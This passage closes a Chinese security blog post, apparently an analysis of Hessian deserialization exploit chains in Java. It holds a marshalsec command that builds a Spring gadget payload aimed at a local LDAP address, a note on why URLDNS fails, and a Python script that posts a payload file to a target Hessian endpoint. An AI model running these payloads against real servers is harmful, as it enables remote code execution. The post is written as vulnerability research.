+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709948778030-155aad61-2e1f-4aeb-9a12-525da7133944.png" alt="image.png"><br><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709948885204-afd5432f-ea2a-4338-b50e-e74f49ffc0aa.png" alt="image.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.Hessian SpringPartiallyComparableAdvisorHolder ldap:<span class="comment">//127.0.0.1:1088</span></span><br></pre></td></tr></table></figure>
+<p><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709951890353-585decb2-0261-46ea-bfc2-206fcf07dab9.png" alt="image.png"></p>
+<h2 id="3-3-URLDNS-报错"><a href="#3-3-URLDNS-报错" class="headerlink" title="3.3 URLDNS - 报错"></a>3.3 URLDNS - 报错</h2><p>按照前面的分析，感觉 <code>URLDNS</code> 利用链也满足需求，但是这里在 <code>java.net.URL</code> 反序列化时抛出异常了<br><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709951387194-b2d502f6-e819-42c7-81c2-3d526d7568cc.png" alt="image.png"><br>原因：Java的<code>Unsafe.allocateInstance()</code>方法是用来创建一个对象实例，但它要求类必须有默认的构造函数<br><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709951577514-3be54ac5-5f85-44c1-b404-086f298cea8e.png" alt="image.png"></p>
+<h1 id="4-实战应用"><a href="#4-实战应用" class="headerlink" title="4. 实战应用"></a>4. 实战应用</h1><h2 id="4-1-审计"><a href="#4-1-审计" class="headerlink" title="4.1 审计"></a>4.1 审计</h2><p><code>HessianServlet</code>、<code>Hessian2Input</code>、<code>HessianInput</code></p>
+<h2 id="4-1-2-远程调用利用"><a href="#4-1-2-远程调用利用" class="headerlink" title="4.1.2 远程调用利用"></a>4.1.2 远程调用利用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span>(<span class="params">name</span>):</span></span><br><span class="line">    header=<span class="string">b&#x27;\x63\x02\x00\x48\x00\x04&#x27;</span>+<span class="string">&#x27;test&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> header+f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">url,payload</span>):</span></span><br><span class="line">    proxies = &#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">    headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;x-application/hessian&#x27;</span>&#125;</span><br><span class="line">    data=payload</span><br><span class="line">    res=requests.post(url,headers=headers,data=data,proxies=proxies)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;http://x.x.x.x&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-p&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;payload file&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.u==<span class="literal">None</span> <span class="keyword">or</span> args.p==<span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;eg. python hessian.py -u http://127.0.0.1/hessian -p hessian.bins&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        send(args.u, load(args.p))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment">#load(&#x27;hessian&#x27;)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>PS: 执行两次的原因在 3.1.1 第 3 步中，后面有时间可以修改这个问题<br><img src="/img/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/1709952974144-06bdf0d5-8e0f-4894-b7bb-3d5b93938e6a.png" alt="image.png"></p>
+<ul>
+<li><input disabled="" type="checkbox"> 增加 Groovy 利用链</li>
+<li><input disabled="" type="checkbox"> Spring AOP 利用链不出网利用链挖掘</li>
+</ul>
+<p>引用</p>
+<blockquote>
+<p>[1] <a target="_blank" rel="noopener" href="https://www.diguage.com/post/hessian-source-analysis-for-java/">https://www.diguage.com/post/hessian-source-analysis-for-java/</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="https://su18.org/post/hessian/">https://su18.org/post/hessian/</a></p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/link">链接</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E7%BC%96%E5%86%99%E5%92%8C%E8%BF%90%E8%A1%8C-Hessian"><span class="toc-number">1.</span> <span class="toc-text">1. 编写和运行 Hessian</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-Servlet"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 Servlet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-Spring"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 Spring</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%88%86%E6%9E%90%E5%92%8C%E8%B0%83%E8%AF%95-Hessian"><span class="toc-number">2.</span> <span class="toc-text">2. 分析和调试 Hessian</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 远程调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 序列化和反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1-%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2 反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 漏洞点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-1-Map-%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1 Map 类型的反序列化</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">3. 利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-Rome%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 Rome利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-1-marshalsec%E7%94%9F%E6%88%90-Exp"><span class="toc-number">3.1.1.</span> <span class="toc-text">3.1.1 marshalsec生成 Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-2-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">3.1.2.</span> <span class="toc-text">3.1.2 利用链分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-3-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-number">3.1.3.</span> <span class="toc-text">3.1.3 二次反序列化不出网利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-SpringPartiallyComparableAdvisorHolder%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 SpringPartiallyComparableAdvisorHolder利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-1-%E7%94%9F%E6%88%90"><span class="toc-number">3.2.1.</span> <span class="toc-text">3.2.1 生成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-2-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">3.2.2.</span> <span class="toc-text">3.2.2 利用链分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-URLDNS-%E6%8A%A5%E9%94%99"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 URLDNS - 报错</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E5%AE%9E%E6%88%98%E5%BA%94%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">4. 实战应用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E5%AE%A1%E8%AE%A1"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-2-%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">4.1.2 远程调用利用</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/&text=Hessian反序列化漏洞分析和利用链"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/&title=Hessian反序列化漏洞分析和利用链"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/&is_video=false&description=Hessian反序列化漏洞分析和利用链"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Hessian反序列化漏洞分析和利用链&body=Check out this article: http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/&title=Hessian反序列化漏洞分析和利用链"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/&title=Hessian反序列化漏洞分析和利用链"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/&title=Hessian反序列化漏洞分析和利用链"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/&title=Hessian反序列化漏洞分析和利用链"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/&name=Hessian反序列化漏洞分析和利用链&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.ninefiger.top/2024/03/09/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8%E9%93%BE/&t=Hessian反序列化漏洞分析和利用链"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2017-2024
+    ninefiger
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/link">链接</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
